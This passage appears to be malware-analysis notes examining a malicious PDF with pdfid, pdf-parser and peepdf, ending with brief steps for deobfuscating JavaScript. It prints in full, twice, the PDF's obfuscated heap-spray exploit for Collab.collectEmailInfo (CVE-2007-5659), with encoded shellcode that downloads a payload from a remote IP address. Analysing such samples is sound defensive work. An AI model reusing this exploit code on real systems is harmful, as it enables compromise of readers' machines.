 obj                   14
 endobj                14
 stream                 2
 endstream              2
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    2
 /JavaScript            3
 /AA                    0
 /OpenAction            1
 /AcroForm              1
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors > 2^24         0
```

## pdf-parser.py
### Search for interesting keyword
```
remnux@siftworkstation: ~/Work
$ pdf-parser.py --search openaction badpdf.pdf
This program has not been tested with this version of Python (3.8.10)
Should you encounter problems, please use Python version 3.4.2
obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 3 0 R, 4 0 R, 5 0 R, 6 0 R, 7 0 R

  <<
    /OpenAction
      <<
        /JS '(this.zfnvkWYOKv\\(\\))'
        /S /JavaScript
      >>
    /Threads 2 0 R
    /Outlines 3 0 R
    /Pages 4 0 R
    /ViewerPreferences
      <<
        /PageDirection /L2R
      >>
    /PageLayout /SinglePage
    /AcroForm 5 0 R
    /Dests 6 0 R
    /Names 7 0 R
    /Type /Catalog
  >>
```

### Parse specific object
```
remnux@siftworkstation: ~/Work
$ pdf-parser.py --object 10 badpdf.pdf 
This program has not been tested with this version of Python (3.8.10)
Should you encounter problems, please use Python version 3.4.2
obj 10 0
 Type: 
 Referencing: 12 0 R

  <<
    /Names [(New_Script) 12 0 R]
  >>
```

### Parse object with output raw format
```
remnux@siftworkstation: ~/Work
$ pdf-parser.py --object 13 -f -w badpdf.pdf 
This program has not been tested with this version of Python (3.8.10)
Should you encounter problems, please use Python version 3.4.2
obj 13 0
 Type: 
 Referencing: 
 Contains stream

  <<
    /Filter /FlateDecode
    /Length 1183
  >>

 b'\r\n\r\nfunction zfnvkWYOKv()\r\n{\r\n\tgwKPaJSHReD0hTAD51qao1s = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036");\r\n\r\n\ttuVglXABgYUAQFEYVPi3lf = unescape("%u9090%u9090"); nDsGdY1TdZUDCCpNeYRdk28BeZ5R = 20 + gwKPaJSHReD0hTAD51qao1s.length\r\n\twhile (tuVglXABgYUAQFEYVPi3lf.length < nDsGdY1TdZUDCCpNeYRdk28BeZ5R) tuVglXABgYUAQFEYVPi3lf += tuVglXABgYUAQFEYVPi3lf;\r\n\tvmRV3x9BCtZs = tuVglXABgYUAQFEYVPi3lf.substring(0, nDsGdY1TdZUDCCpNeYRdk28BeZ5R);\r\n\tdVghsR4KOJoE6WzWkTW0vz = tuVglXABgYUAQFEYVPi3lf.substring(0, tuVglXABgYUAQFEYVPi3lf.length-nDsGdY1TdZUDCCpNeYRdk28BeZ5R);\r\n\twhile(dVghsR4KOJoE6WzWkTW0vz.length + nDsGdY1TdZUDCCpNeYRdk28BeZ5R < 0x40000) dVghsR4KOJoE6WzWkTW0vz = dVghsR4KOJoE6WzWkTW0vz + dVghsR4KOJoE6WzWkTW0vz + vmRV3x9BCtZs;\r\n\r\n\tdddA9SvmIp7bFVTvbRcRoFQ = new Array();\r\n\r\n\tfor ( i = 0; i < 2020; i++ ) dddA9SvmIp7bFVTvbRcRoFQ[i] = dVghsR4KOJoE6WzWkTW0vz + gwKPaJSHReD0hTAD51qao1s;\r\n\r\n\tfunction rHjX2qS2YpWWuvNjX9JfKZ3F(qlrSKFKRQUuUXlV0ES9I6oz4pM, oq7g9J0RSV3FcMgr9DLvvDY8ee)\r\n\t{\r\n\t\tvar lTZGviUaML2vE40mHbYk = "";\r\n\r\n\t\twhile (--qlrSKFKRQUuUXlV0ES9I6oz4pM >= 0) lTZGviUaML2vE40mHbYk += oq7g9J0RSV3FcMgr9DLvvDY8ee;\r\n\t\treturn lTZGviUaML2vE40mHbYk;\r\n\t}\r\n\r\n\tCollab.collectEmailInfo({msg:rHjX2qS2YpWWuvNjX9JfKZ3F(4096, unescape("%u0909%u0909"))});\r\n}\r\n\r\n'

remnux@siftworkstation: ~/Work
$ pdf-parser.py --object 13 -f -w -d obj13.js badpdf.pdf 
This program has not been tested with this version of Python (3.8.10)
Should you encounter problems, please use Python version 3.4.2
obj 13 0
 Type: 
 Referencing: 
 Contains stream

  <<
    /Filter /FlateDecode
    /Length 1183
  >>
```

### Scan with yara rule
```
remnux@siftworkstation: ~/Work
$ pdf-parser.py -y yara.yar badpdf.pdf 
```

## peepdf
```
remnux@siftworkstation: ~/Work
$ peepdf -i badpdf.pdf 
Warning: PyV8 is not installed!!

File: badpdf.pdf
MD5: 2264dd0ee26d8e3fbdf715dd0d807569
SHA1: 99a84407ad137c16c54310ccf360f89999676520
SHA256: ad6cedb0d1244c1d740bf5f681850a275c4592281cdebb491ce533edd9d6a77d
Size: 2754 bytes
Version: 1.3
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 14
Streams: 2
URIs: 0
Comments: 0
Errors: 0

Version 0:
	Catalog: 1
	Info: 14
	Objects (14): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
	Streams (2): [11, 13]
		Encoded (2): [11, 13]
	Objects with JS code (2): [1, 13]
	Suspicious elements:
		/AcroForm (1): [1]
		/OpenAction (1): [1]
		/Names (2): [1, 10]
		/JS (2): [1, 12]
		/JavaScript (3): [1, 7, 12]
		Collab.collectEmailInfo (CVE-2007-5659) (1): [13]



PPDF> object 13

<< /Length 1183
/Filter /FlateDecode >>
stream


function zfnvkWYOKv()
{
	gwKPaJSHReD0hTAD51qao1s = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036");

	tuVglXABgYUAQFEYVPi3lf = unescape("%u9090%u9090"); nDsGdY1TdZUDCCpNeYRdk28BeZ5R = 20 + gwKPaJSHReD0hTAD51qao1s.length
	while (tuVglXABgYUAQFEYVPi3lf.length < nDsGdY1TdZUDCCpNeYRdk28BeZ5R) tuVglXABgYUAQFEYVPi3lf += tuVglXABgYUAQFEYVPi3lf;
	vmRV3x9BCtZs = tuVglXABgYUAQFEYVPi3lf.substring(0, nDsGdY1TdZUDCCpNeYRdk28BeZ5R);
	dVghsR4KOJoE6WzWkTW0vz = tuVglXABgYUAQFEYVPi3lf.substring(0, tuVglXABgYUAQFEYVPi3lf.length-nDsGdY1TdZUDCCpNeYRdk28BeZ5R);
	while(dVghsR4KOJoE6WzWkTW0vz.length + nDsGdY1TdZUDCCpNeYRdk28BeZ5R < 0x40000) dVghsR4KOJoE6WzWkTW0vz = dVghsR4KOJoE6WzWkTW0vz + dVghsR4KOJoE6WzWkTW0vz + vmRV3x9BCtZs;

	dddA9SvmIp7bFVTvbRcRoFQ = new Array();

	for ( i = 0; i < 2020; i++ ) dddA9SvmIp7bFVTvbRcRoFQ[i] = dVghsR4KOJoE6WzWkTW0vz + gwKPaJSHReD0hTAD51qao1s;

	function rHjX2qS2YpWWuvNjX9JfKZ3F(qlrSKFKRQUuUXlV0ES9I6oz4pM, oq7g9J0RSV3FcMgr9DLvvDY8ee)
	{
		var lTZGviUaML2vE40mHbYk = "";

		while (--qlrSKFKRQUuUXlV0ES9I6oz4pM >= 0) lTZGviUaML2vE40mHbYk += oq7g9J0RSV3FcMgr9DLvvDY8ee;
		return lTZGviUaML2vE40mHbYk;
	}

	Collab.collectEmailInfo({msg:rHjX2qS2YpWWuvNjX9JfKZ3F(4096, unescape("%u0909%u0909"))});
}


endstream

PPDF> object 13 > jsdump.js # dump to file
PPDF> 
```

# JS Analysis and deobfuscation
Basic one:
1. Beautify the code
2. Remove variables that is only used once
3. Replace complicated values with readble values
4. Rename variables names
5. Manual deobfuscation using above steps and add some codes to debug the JS, such as `document.write(interesting_var)` or add new line of code to call the interesting function `interesting_function()`

# Zelster's Cheatsheet

![image](https://user-images.githubusercontent.com/56353946/227059639-92f25596-bfdf-48af-9f6f-ba5e1e5405ab.png)


